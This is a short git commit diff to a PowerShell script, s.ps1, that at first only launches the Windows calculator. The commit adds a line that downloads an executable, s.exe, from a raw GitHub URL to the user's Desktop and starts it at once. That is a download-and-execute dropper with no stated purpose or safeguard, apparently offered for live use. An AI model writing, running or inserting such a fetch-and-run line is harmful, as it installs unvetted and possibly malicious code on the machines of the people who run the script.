d9f8d47cc85b32e97255701637d03817d61eea55
guilegel4 <guilegel4@mail.com>
2025-02-05 17:23:54 +0100

    Update s.ps1

--- s.ps1
+++ s.ps1
@@ -1,1 +1,2 @@
 Start-Process "calc.exe"
+$exePath="$env:USERPROFILE\Desktop\s.exe"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/s.exe" -OutFile $exePath; Start-Process $exePath
